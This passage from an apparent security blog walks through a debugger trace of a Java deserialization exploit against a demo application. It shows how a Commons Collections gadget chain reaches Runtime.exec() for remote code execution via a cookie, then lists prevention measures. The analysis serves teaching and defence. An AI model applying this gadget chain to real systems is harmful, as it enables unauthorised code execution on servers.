The next 3 Transformers are `InvokerTransformer`. `InvokerTransformer` is a class in the Apache Commons Collections library that implements the `Transformer` interface. Its main function is to call a `method` on an `object` using the `Java Reflection API`.

The `Java Reflection API` is a collection of `classes` and `interfaces` in the `java.lang.reflect` package, allowing programs to inspect and manipulate `classes`, `methods`, `fields`, `constructors` at `runtime`, even when detailed information about them is not known in advance.

Here, the `Java Reflection API` is used to indirectly call a method. This API allows calling a method of any class. An example of invoke can get a method from another class:
![debug2_chainedtransformer_loop_1_6.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_6.png?alt=media&token=567683ed-b4a1-43b2-92d9-045c7747057b)

With the conventional way:

![debug2_chainedtransformer_loop_1_7.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_7.png?alt=media&token=277de424-b519-4f30-bb7f-c8c4d35a0598)

Using Reflection:
![debug2_chainedtransformer_loop_1_8.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_8.png?alt=media&token=0c07908c-6f0f-4c22-a888-c4f19e76d352)
That is, `method.invoke(obj, param)` is equivalent to `obj.method(param)`

- `i = 1`, `object = Runtime.class`:
  ![debug2_chainedtransformer_loop_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1.png?alt=media&token=47ce2ff4-fca1-450b-9d3d-276429910907)

  The `transform` method in `InvokerTransformer`:
  ![debug2_chainedtransformer_loop_1_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_1.png?alt=media&token=b608bbce-0dd9-4c71-b514-6052cd82673c)

  Going into the analysis, the initial `input` is `object` (Runtime.class). The first if condition is not satisfied, so the program falls into the try block:
  ![debug2_chainedtransformer_loop_1_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_2.png?alt=media&token=914b5899-1fd0-4960-bbd8-0c0336d58b27)

  - `Class cls = input.getClass()`:

    The `getClass()` method helps get the class of the object, here `input` is `Runtime.class` so `cls` will be class `Class` or `Class.class`:
    ![debug2_chainedtransformer_loop_1_3.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_3.png?alt=media&token=5195fb44-2ecd-4b44-a29c-877f8eadac80)

  - `Method method = cls.getMethod(iMethodName, iParamType)`:

    The `getMethod()` method gets a method on a class.

    `cls` has the value `Class.class`.

    `iMethodName` is `"getMethod"`.

    `iParamType` is `Class[] { String.class, Class[].class }`.
    ![debug2_chainedtransformer_loop_1_4.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_4.png?alt=media&token=9dce1c67-676d-43f5-8a68-beb4f9158f5f)

    It follows that `Method method = Class.class.getMethod("getMethod", Class[] { String.class, Class[].class })`, so `getMethod` will return the `getMethod` method of the `Class` class => `method` is `Class.getMethod`.
    ![debug2_chainedtransformer_loop_1_9.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_9.png?alt=media&token=e6d9a0dd-10f2-4ea5-88c5-21991fb0d816)

  - `return method.invoke(input, iArgs)`:

    `method` is `Class.getMethod`.

    `input` is `Runtime.class`.

    `iArgs` is `Object[] {"getRuntime", new Class[0] }`.
    ![debug2_chainedtransformer_loop_1_5.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_1_5.png?alt=media&token=bfd8c636-0912-4abd-bfad-b6f78d62a8e3)

    With the final code using reflection, it can be understood as `Runtime.class.getMethod("getRuntime")`, the result returned is an object of type `Method` => `object` is the `getRuntime` method of the `Runtime` class.

<br>

- `i = 2`, `object` is `Method getRuntime()`:

  ![debug2_chainedtransformer_loop_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_2.png?alt=media&token=f233f768-166e-4182-9666-b2744592da54)
  ![debug2_chainedtransformer_loop_2_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_2_1.png?alt=media&token=25920428-a5b8-435f-9914-d8603ac313e3)

  - `Class cls = input.getClass()`:

    `input` is the `getRuntime` method, and `getRuntime` is an instance of the `Method` class, so `getClass()` will return the class `Method` => `cls` is the class `Method`:
    ![debug2_chainedtransformer_loop_2_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_2_2.png?alt=media&token=357894e5-314c-4265-ace3-546971723124)

  - `Method method = cls.getMethod(iMethodName, iParamTypes)`:

    `cls` is `Method.class`.

    `iMethodName` is `invoke`.

    `iParamTypes` is `Class[] { Object.class, Object[].class }`.
    ![debug2_chainedtransformer_loop_2_3.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_2_3.png?alt=media&token=a621278c-87f2-41bb-846b-ebe5e6926df9)
    It is equivalent to `Method.class.getMethod("invoke", Class[] { Object.class, Object[].class })`, will return the `invoke` method of the `Method` class => `method` is `Method.invoke()`
    ![debug2_chainedtransformer_loop_2_4.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_2_4.png?alt=media&token=604cb184-3b70-4db7-b50b-ca36421e1816)

  - `return method.invoke(input, iArgs)`:

    `method` is `Method.invoke()`.

    `input` is `Method getRuntime()`.

    `iArgs` is `Object[] { null, new Object[0] }`.
    ![debug2_chainedtransformer_loop_2_5.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_2_5.png?alt=media&token=46050b32-fac0-4a43-9f55-55c4d832aa46)

    At this step, `method` is `Method.invoke()`, so the code can be understood as `getRuntime.invoke(null, null)`, which is executing `Runtime.getRuntime()`. When executed, it will call `Runtime.getRuntime()` and return an instance of `Runtime`. Meanwhile, at step `i = 1`, `object` was only the `getRuntime` method, that is, an `instance` of `Method`, not actually executed.

<br>

- `i = 3`, `object = Runtime.getRuntime()`:

  ![debug2_chainedtransformer_loop_3.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_3.png?alt=media&token=09d0b767-6b13-4e0a-8451-696571569a40)
  ![debug2_chainedtransformer_loop_3_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_3_1.png?alt=media&token=c599e682-1d3b-465b-afa1-01c946b72419)

  - `Class cls = input.getClass()`:

    `input` is `Runtime.getRuntime()`, so `getClass()` will get the class of this method => `cls` is `Runtime.class`.
    ![debug2_chainedtransformer_loop_3_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_3_2.png?alt=media&token=82fc856d-eb5d-40e6-a251-7ba28f1b8fdf)

  - `Method method = cls.getMethod(iMethodName, iParamTypes)`:

    `cls` is `Runtime.class`.

    `iMethodName` is `"exec"`.

    `iParamTypes` is `Class[] { String.class }`.
    ![debug2_chainedtransformer_loop_3_3.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_3_3.png?alt=media&token=89c81409-b099-4fd8-bd18-684f108f2e03)

    `getMethod()` will get the `exec` method of the `Runtime` class => `method` is `Runtime.exec()`.
    ![debug2_chainedtransformer_loop_3_4.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_3_4.png?alt=media&token=220669f7-8f73-4101-9ddf-e7fb0ab72c63)

  - `return method.invoke(input, iArgs)`:

    `method` is `Runtime.exec()`.

    `input` is `Runtime.getRuntime()`.

    `iArgs` is `execArgs` which is the command we want to execute.
    ![debug2_chainedtransformer_loop_3_5.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_3_5.png?alt=media&token=1656bd4b-4f74-472b-ae48-56a38ea78b59)

    It will execute `Runtime.getRuntime().exec(execArgs)`
    ![debug2_chainedtransformer_loop_3_6.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_3_6.png?alt=media&token=910bb1fb-418d-4e77-8e45-427675460844)

    and RCE
    ![debug2_chainedtransformer_loop_3_7.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_3_7.png?alt=media&token=9fc140bc-5819-4359-a7ed-273e4faa7718)
    This time, it returns an instance of `Process` representing the process just created.

<br>

The final Transformer is a `ConstantTransformer`

- `i = 4`, `object` is an instance of `Process`(UNIXProcess):

  ![debug2_chainedtransformer_loop_4.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_4.png?alt=media&token=1df5d970-bb64-4254-af68-4c17438fc9bb)

  `ConstantTransformer` returns a fixed value regardless of the input, so it returns 1 to end the Transformer chain, avoiding errors when no more actions are needed.
  ![debug2_chainedtransformer_loop_4_1.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_4_1.png?alt=media&token=a11ad0c1-d7d6-4fd0-80c5-6b060acc1885)

Next, when `i = 5`, the loop has gone through the entire `iTransformers` array, it returns `object` carrying the value of the last `Transformer` returned, which is `1`.
![debug2_chainedtransformer_loop_4_2.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_chainedtransformer_loop_4_2.png?alt=media&token=ac2c44c3-d78d-4f83-95a1-8efe6df18428)

At this point, back to `LazyMap`, `value` carries the value returned at the end of the Transformer chain, which is `1`, the key `"foo"` is added to the map (the `innerMap` object from the payload - a HashMap) and returns `value` (1).
![debug2_lazymap_putkey.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fdebug2_lazymap_putkey.png?alt=media&token=e31a72f1-2e9e-47e8-a57f-afc18e3a8fff)

To TiedMapEntry, the 2 methods `getKey()` and `getValue` are done
![tiedmapentry_return.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Ftiedmapentry_return.png?alt=media&token=c88c9014-3f72-46d7-92ed-2d1a92bc8bdd)
`getKey()` returns `"foo"`, `getValue()` returns `1` => `TiedMapEntry.toString()` returns `"foo=1"`

Next to `BadAttributeExpException`, now `val` will have the value `"foo=1"`
![val_value.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fval_value.png?alt=media&token=eb85e26d-981f-40fd-ab77-082584f3f499)

And finally back to `AuthController`, it returns the object that has been deserialized
![authcontroller_return.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fauthcontroller_return.png?alt=media&token=797f71c6-8ffd-4066-b0e6-00220b79a9af)
and continues the application.
![web_running.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Fweb_running.png?alt=media&token=601120cf-cc04-45ce-a51f-4ab1e637f132)

On the web page, "Invalid Cookie" appears, but we have successfully exploited it.
![invalid_cookie.png](https://firebasestorage.googleapis.com/v0/b/blogs-for-portfolio.firebasestorage.app/o/blog-images%2Farchive%2Finvalid_cookie.png?alt=media&token=29880cf9-a45e-4911-976a-59f7ab412512)

---

# **7. Prevention Measures**

After analyzing the `insecure deserialization` vulnerability and how it leads to RCE in the demo application, implementing prevention measures is extremely important to protect systems from similar attacks. Below are detailed prevention methods, applied directly to this application and extendable to other Java applications.

## **7.1. Avoid Using Deserialization for Untrusted Data**

The current application uses `ObjectInputStream.readObject(`) to directly deserialize the `user_session` cookie from user-provided data without any checks.

Instead of `serializing` and `deserializing` the username in a cookie, use a more secure session management mechanism such as `JSON Web Token (JWT)` or a session ID that is encrypted and signed by the server.

## **7.2. Limit Classes Allowed to Deserialize**

Currently, the `deserializeFromBase64` method allows deserializing any class that implements Serializable, leading to attackers being able to insert a gadget chain.

If deserialization is mandatory, use ObjectInputFilter (available from Java 9, but can be backported to Java 8) to whitelist classes allowed to deserialize.

## **7.3. Use Cookie Authentication and Encryption Mechanisms**

The `user_session` cookie contains an unprotected serialized value, easily changed by attackers.

A solution could be to add an `HMAC (Hash-based Message Authentication Code)` signature to the cookie value to ensure integrity.

## **7.4. Update and Remove Vulnerable Libraries**

The application uses `commons-collections:3.1`, an old version that has been publicly known to have bugs containing gadget-chains leading to RCE.

Upgrade to newer versions like commons-collections4 (e.g.: 4.4), which have removed and mitigated dangerous gadgets. Use newer Java versions like 17, 23.

Audit all dependencies with tools to detect outdated or vulnerable libraries.

## **7.5. Enhance Monitoring**

As in the demo application, deserialization errors are only printed to the stack trace (e.printStackTrace()), with no attack detection mechanism. We can add detailed logging to record deserialization errors and monitor abnormal behaviors.

Combine with a SIEM system to detect attack patterns such as sending large or unusual payloads.
